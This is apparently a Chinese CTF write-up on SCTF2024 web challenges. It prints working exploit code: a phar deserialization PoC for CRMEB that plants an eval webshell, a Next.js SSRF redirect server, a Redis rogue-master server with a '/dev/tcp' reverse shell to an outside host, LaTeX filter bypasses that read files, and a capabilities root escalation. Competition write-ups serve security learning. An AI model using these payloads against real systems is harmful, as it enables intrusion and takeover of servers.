<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2024/10/02/SCTF2024/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/10/02/SCTF2024/","path":"2024/10/02/SCTF2024/","title":"SCTF2024"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SCTF2024 | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Simpleshop"><span class="nav-text">Simpleshop</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezjump"><span class="nav-text">ezjump</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-tex"><span class="nav-text">ez_tex</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#havefun"><span class="nav-text">havefun</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SycServer2-0"><span class="nav-text">SycServer2.0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/02/SCTF2024/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="SCTF2024 | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SCTF2024
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-10-02 23:41:45" itemprop="dateCreated datePublished" datetime="2024-10-02T23:41:45+08:00">2024-10-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/bg.jpg" alt="bg"></p>
<a id="more"></a>

<h1 id="Simpleshop"><a href="#Simpleshop" class="headerlink" title="Simpleshop"></a>Simpleshop</h1><blockquote>
<p>Recently, my e-commerce site has been illegally invaded, hackers through a number of means to achieve the purchase of zero actually free of charge to buy a brand new Apple / Apple iPad, you can help me to find out where the problem is?</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-6943%E3%80%81https://avd.aliyun.com/detail?id=AVD-2024-6944">https://avd.aliyun.com/detail?id=AVD-2024-6943、https://avd.aliyun.com/detail?id=AVD-2024-6944</a><br>CRMEB 5.4.0 0day，根据漏洞通报定位漏洞函数：get_image_base64，本地审计梳理利用链为：前台用户上传文件，phar反序列化RCE</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152601211.png" alt="image-20241002152601211"></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152622197.png" alt="image-20241002152622197"></p>
<p>文件内容有检查，通过gzip压缩生成的phar文件即可绕过</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152722897.png" alt="image-20241002152722897"></p>
<p>poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace GuzzleHttp\Cookie&#123;</span><br><span class="line"></span><br><span class="line">    class SetCookie &#123;</span><br><span class="line"></span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data[&#39;Expires&#39;] &#x3D; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;</span><br><span class="line">            $this-&gt;data[&#39;Discard&#39;] &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class CookieJar&#123;</span><br><span class="line">        private $cookies &#x3D; [];</span><br><span class="line">        private $strictMode;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            $this-&gt;cookies[] &#x3D; new SetCookie();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class FileCookieJar extends CookieJar &#123;</span><br><span class="line">        private $filename;</span><br><span class="line">        private $storeSessionCookies;</span><br><span class="line">        function __construct() &#123;</span><br><span class="line">            parent::__construct();</span><br><span class="line">            $this-&gt;filename &#x3D; &quot;public&#x2F;y0.php&quot;;</span><br><span class="line">            $this-&gt;storeSessionCookies &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $exp &#x3D; new GuzzleHttp\Cookie\FileCookieJar();</span><br><span class="line">	var_dump($exp);</span><br><span class="line"></span><br><span class="line">    $phar &#x3D; new Phar(&#39;test.phar&#39;);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); </span><br><span class="line">    $phar -&gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);</span><br><span class="line">    $phar -&gt; setMetadata($exp);</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">    rename(&#39;test.phar&#39;,&#39;test.jpg&#39;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上传：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152913622.png" alt="image-20241002152913622"></p>
<p>触发：</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002152945220.png" alt="image-20241002152945220"></p>
<p>蚁剑-&gt; fpm bypass df -&gt; suid读flag</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002154043595.png" alt="image-20241002154043595"></p>
<h1 id="ezjump"><a href="#ezjump" class="headerlink" title="ezjump"></a>ezjump</h1><blockquote>
<p>Just jump!</p>
</blockquote>
<p>通过源码结构及flag文件位置，猜测是通过前端走私/SSRF到后端然后打redis的RCE</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002161111322.png" alt="image-20241002161111322"></p>
<p>通过依赖检查发现Next.js存在一个SSRF的洞，<a target="_blank" rel="noopener" href="https://github.com/azu/nextjs-CVE-2024-34351%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AASSRF">https://github.com/azu/nextjs-CVE-2024-34351，通过一个SSRF</a> server和修改Host Origin头即可</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002161324826.png" alt="image-20241002161324826"></p>
<p>SSRF server：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, Response, redirect</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;play&#39;)</span><br><span class="line">def exploit():</span><br><span class="line">    # CORS preflight check</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;HEAD&#39;:</span><br><span class="line">        response &#x3D; Response()</span><br><span class="line">        response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;x-component&#39;</span><br><span class="line">        return response</span><br><span class="line">    # after CORS preflight check</span><br><span class="line">    elif request.method &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        ssrfUrl &#x3D; &#39;http:&#x2F;&#x2F;172.11.0.3:5000&#x2F;&#39;</span><br><span class="line">        return redirect(ssrfUrl)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(port&#x3D;1337, host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True)</span><br></pre></td></tr></table></figure>



<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002164210894.png" alt="image-20241002164210894"></p>
<p>在get_user时，会对redis发起 RESP 请求</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002172512348.png" alt="image-20241002172512348"></p>
<p>可以直接打主从复制rce，构造fake server</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">from time import sleep</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">def RogueServer(lport):</span><br><span class="line">    resp &#x3D; &quot;&quot;</span><br><span class="line">    sock&#x3D;socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((&quot;0.0.0.0&quot;,lport))</span><br><span class="line">    sock.listen(10)</span><br><span class="line">    conn,address &#x3D; sock.accept()  </span><br><span class="line">    sleep(5)</span><br><span class="line">    while True:    </span><br><span class="line">        data &#x3D; conn.recv(1024)</span><br><span class="line">        if &quot;PING&quot; in data:</span><br><span class="line">            resp&#x3D;&quot;+PONG&quot;+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        elif &quot;REPLCONF&quot; in data:</span><br><span class="line">            resp&#x3D;&quot;+OK&quot;+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        elif &quot;PSYNC&quot; in data or &quot;SYNC&quot; in data:</span><br><span class="line">            resp &#x3D;  &quot;+FULLRESYNC &quot; + &quot;Z&quot;*40 + &quot; 1&quot; + CLRF</span><br><span class="line">            resp +&#x3D; &quot;$&quot; + str(len(payload)) + CLRF</span><br><span class="line">            resp &#x3D; resp.encode()</span><br><span class="line">            resp +&#x3D; payload + CLRF.encode()</span><br><span class="line">            if type(resp) !&#x3D; bytes:</span><br><span class="line">                resp &#x3D;resp.encode()            </span><br><span class="line">            conn.send(resp)    </span><br><span class="line">        #elif &quot;exit&quot; in data:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    parser &#x3D; OptionParser()                     </span><br><span class="line">    parser.add_option(&quot;--lport&quot;, dest&#x3D;&quot;lp&quot;, type&#x3D;&quot;int&quot;,help&#x3D;&quot;rogue server listen port, default 21000&quot;, default&#x3D;21000,metavar&#x3D;&quot;LOCAL_PORT&quot;)        </span><br><span class="line">    parser.add_option(&quot;-f&quot;,&quot;--exp&quot;, dest&#x3D;&quot;exp&quot;, type&#x3D;&quot;string&quot;,help&#x3D;&quot;Redis Module to load, default exp.so&quot;, default&#x3D;&quot;exp.so&quot;,metavar&#x3D;&quot;EXP_FILE&quot;)            </span><br><span class="line"></span><br><span class="line">    (options , args )&#x3D; parser.parse_args()</span><br><span class="line">    lport &#x3D; options.lp</span><br><span class="line">    exp_filename &#x3D; options.exp</span><br><span class="line"></span><br><span class="line">    CLRF&#x3D;&quot;\r\n&quot;</span><br><span class="line">    payload&#x3D;open(exp_filename,&quot;rb&quot;).read()</span><br><span class="line">    print &quot;Start listing on port: %s&quot; %lport</span><br><span class="line">    print &quot;Load the payload:   %s&quot; %exp_filename     </span><br><span class="line">    RogueServer(lport)</span><br></pre></td></tr></table></figure>

<p>构造ssrf请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, Response, redirect</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;play&#39;)</span><br><span class="line">def exploit():</span><br><span class="line">    # CORS preflight check</span><br><span class="line">    if request.method &#x3D;&#x3D; &#39;HEAD&#39;:</span><br><span class="line">        response &#x3D; Response()</span><br><span class="line">        response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;x-component&#39;</span><br><span class="line">        return response</span><br><span class="line">    # after CORS preflight check</span><br><span class="line">    elif request.method &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class="line">        padding &#x3D; &quot;\r\n&quot;</span><br><span class="line">        inject &#x3D; &quot;$1\r\na\r\n&quot;</span><br><span class="line">        # 主从</span><br><span class="line">        #inject +&#x3D; &quot;SLAVEOF 1.1.1.1 21000\r\n\r\n\r\nCONFIG SET dbfilename exp.so\r\n&quot;</span><br><span class="line">        # 执行命令</span><br><span class="line">        inject +&#x3D; &quot;MODULE LOAD .&#x2F;exp.so\r\nsystem.exec &#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;1338 0&gt;&amp;1\&quot;&#39;\r\n&quot;</span><br><span class="line">        padding +&#x3D; inject</span><br><span class="line">        user &#x3D; &quot;admin&quot;*len(padding)+padding</span><br><span class="line">        ssrfUrl &#x3D; f&#39;http:&#x2F;&#x2F;172.11.0.3:5000&#x2F;login?password&#x3D;&amp;username&#x3D;&#123;urllib.parse.quote(user)&#125;&#39;</span><br><span class="line">        return redirect(ssrfUrl)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(port&#x3D;1337, host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True)</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002172739084.png" alt="image-20241002172739084"></p>
<h1 id="ez-tex"><a href="#ez-tex" class="headerlink" title="ez_tex"></a>ez_tex</h1><p>上传/编译 LaTex 文件，无回显，/log路径只显示一个app.log</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002184754739.png" alt="image-20241002184754739"></p>
<p>文件内容检测通过 <code>^^41 == A</code> 绕过，尝试往app.log写内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass[]&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line"></span><br><span class="line">\newwrite\outfile</span><br><span class="line">\imm^^65diate\openout\outfile&#x3D;a^^70p.log</span><br><span class="line">\imm^^65diate\write\outfile&#123;helloworld&#125;</span><br><span class="line">\imm^^65diate\closeout\outfile</span><br><span class="line"></span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002185205934.png" alt="image-20241002185205934"></p>
<p>成功读取到main.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">\newread\infile</span><br><span class="line">\newwrite\outfile</span><br><span class="line">\openin\infile&#x3D;main.py</span><br><span class="line">\imm^^65diate\openout\outfile&#x3D;a^^70p.log</span><br><span class="line">\loop</span><br><span class="line">    \read\infile to \line</span><br><span class="line">    \ifeof\infile\else</span><br><span class="line">        \imm^^65diate\write\outfile&#123;\line&#125;</span><br><span class="line">\repeat</span><br><span class="line">\closein\infile</span><br><span class="line">\imm^^65diate\closeout\outfile</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure>

<p>main.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os </span><br><span class="line">import logging </span><br><span class="line">import subprocess </span><br><span class="line">from flask import Flask, request, render_template, redirect </span><br><span class="line">from werkzeug.utils import secure_filename </span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__) </span><br><span class="line"></span><br><span class="line">if not app.debug: </span><br><span class="line">        handler &#x3D; logging.FileHandler(&#39;app.log&#39;) </span><br><span class="line">        handler.setLevel(logging.INFO) </span><br><span class="line">        app.logger.addHandler(handler) </span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER &#x3D; &#39;uploads&#39; </span><br><span class="line">app.config[&#39;UPLOAD_FOLDER&#39;] &#x3D; UPLOAD_FOLDER </span><br><span class="line"></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok&#x3D;True) </span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS &#x3D; &#123;&#39;txt&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;gif&#39;, &#39;log&#39;, &#39;tex&#39;&#125; </span><br><span class="line"></span><br><span class="line">def allowed_file(filename): </span><br><span class="line">        return &#39;.&#39; in filename and \ </span><br><span class="line">        filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS </span><br><span class="line"></span><br><span class="line">def compile_tex(file_path): </span><br><span class="line">        output_filename &#x3D; file_path.rsplit(&#39;.&#39;, 1)[0] + &#39;.pdf&#39; </span><br><span class="line">        try: </span><br><span class="line">                subprocess.check_call([&#39;pdflatex&#39;, file_path]) </span><br><span class="line">                return output_filename </span><br><span class="line">        except subprocess.CalledProcessError as e: </span><br><span class="line">                return str(e) </span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;) </span><br><span class="line">def index(): </span><br><span class="line">        return render_template(&#39;index.html&#39;) </span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;POST&#39;]) </span><br><span class="line">def upload_file(): </span><br><span class="line">        if &#39;file&#39; not in request.files: </span><br><span class="line">                return redirect(request.url) </span><br><span class="line">        file &#x3D; request.files[&#39;file&#39;] </span><br><span class="line">        if file.filename &#x3D;&#x3D; &#39;&#39;: </span><br><span class="line">                return redirect(request.url) </span><br><span class="line"></span><br><span class="line">        if file and allowed_file(file.filename): </span><br><span class="line">                content &#x3D; file.read() </span><br><span class="line">                try: </span><br><span class="line">                        content_str &#x3D; content.decode(&#39;utf-8&#39;) </span><br><span class="line">                except UnicodeDecodeError: </span><br><span class="line">                        return &#39;File content is not decodable&#39; </span><br><span class="line">                for bad_char in [&#39;\\x&#39;, &#39;..&#39;, &#39;*&#39;, &#39;&#x2F;&#39;, &#39;input&#39;, &#39;include&#39;, &#39;write18&#39;, &#39;immediate&#39;,&#39;app&#39;, &#39;flag&#39;]: </span><br><span class="line">                        if bad_char in content_str: </span><br><span class="line">                                return &#39;File content is not safe&#39; </span><br><span class="line">                file.seek(0) </span><br><span class="line">                filename &#x3D; secure_filename(file.filename) </span><br><span class="line">                file_path &#x3D; os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename) </span><br><span class="line">                file.save(file_path) </span><br><span class="line">                return &#39;File uploaded successfully, And you can compile the tex file&#39; </span><br><span class="line">        else: </span><br><span class="line">        return &#39;Invalid file type or name&#39; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;compile&#39;, methods&#x3D;[&#39;GET&#39;]) </span><br><span class="line">def compile(): </span><br><span class="line">        filename &#x3D; request.args.get(&#39;filename&#39;) </span><br><span class="line"></span><br><span class="line">        if not filename: </span><br><span class="line">                return &#39;No filename provided&#39;, 400 </span><br><span class="line"></span><br><span class="line">        if len(filename) &gt;&#x3D; 7: </span><br><span class="line">                return &#39;Invalid file name length&#39;, 400 </span><br><span class="line"></span><br><span class="line">        if not filename.endswith(&#39;.tex&#39;): </span><br><span class="line">                return &#39;Invalid file type&#39;, 400 </span><br><span class="line"></span><br><span class="line">        file_path &#x3D; os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename) </span><br><span class="line">        print(file_path) </span><br><span class="line">        if not os.path.isfile(file_path): </span><br><span class="line">                return &#39;File not found&#39;, 404 </span><br><span class="line"></span><br><span class="line">        output_pdf &#x3D; compile_tex(file_path) </span><br><span class="line">        if output_pdf.endswith(&#39;.pdf&#39;): </span><br><span class="line">                return &quot;Compilation succeeded&quot; </span><br><span class="line">        else: </span><br><span class="line">                return &#39;Compilation failed&#39;, 500 </span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;log&#39;) </span><br><span class="line">def log(): </span><br><span class="line">        try: </span><br><span class="line">                with open(&#39;app.log&#39;, &#39;r&#39;) as log_file: </span><br><span class="line">                log_contents &#x3D; log_file.read() </span><br><span class="line">                return render_template(&#39;log.html&#39;, log_contents&#x3D;log_contents) </span><br><span class="line">        except FileNotFoundError: </span><br><span class="line">                return &#39;Log file not found&#39;, 404 </span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;: </span><br><span class="line">app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;3000, debug&#x3D;False) </span><br></pre></td></tr></table></figure>

<p>写html打SSTI，然后suid提权无果，<strong>Capabilities 提权</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002191814264.png" alt="image-20241002191814264"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3.11 -c &#39;import os; os.setuid(0); os.system(&quot;cat &#x2F;root&#x2F;sctf &gt; &#x2F;app&#x2F;ez_tex&#x2F;static&#x2F;1.txt&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002192220297.png" alt="image-20241002192220297"></p>
<h1 id="havefun"><a href="#havefun" class="headerlink" title="havefun"></a>havefun</h1><blockquote>
<p>小李刚毕业入职一家公司，老板交给了他一个任务，但是他第一次配置php相关服务，好像存在一些问题，马上要检查了，小李是否会挨骂呢？</p>
</blockquote>
<p>主页指向了 <code>/static/SCTF.jpg</code> ，文件尾存在php代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; &#39;&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf&#39;;</span><br><span class="line">$content &#x3D; file_get_contents($file);</span><br><span class="line">echo htmlspecialchars($content);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过 <strong>路径解析错误</strong> 成功将jpg执行为php <code>http://1.95.37.51/static/SCTF.jpg/a.php</code></p>
<p>获取到 000-default.conf 内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ServerAdmin webmaster@localhost</span><br><span class="line">        DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">        PassengerAppRoot &#x2F;usr&#x2F;share&#x2F;redmine</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line">        &lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;redmine&gt;</span><br><span class="line">                RailsBaseURI &#x2F;redmine</span><br><span class="line">                #PassengerResolveSymlinksInDocumentRoot on</span><br><span class="line">        &lt;&#x2F;Directory&gt;</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteRule  ^(.+\.php)$  $1  [H&#x3D;application&#x2F;x-httpd-php]</span><br><span class="line">        LogLevel alert rewrite:trace3</span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<p>其中两条重写规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteRule  ^(.+\.php)$  $1  [H&#x3D;application&#x2F;x-httpd-php]</span><br><span class="line">RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html</span><br></pre></td></tr></table></figure>

<p>根据橘子神的：<a target="_blank" rel="noopener" href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! </a> 中的</p>
<p><code>Jailbreak Local Gadgets to Redmine RCE</code>，可以轻松获取到 secret_key.txt 的内容，从而实现攻击 <code>Ruby on Rails</code>，一个通过Cookie反序列化的RCE：<a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view">小心！你的 Rails 有被打過嗎？</a></p>
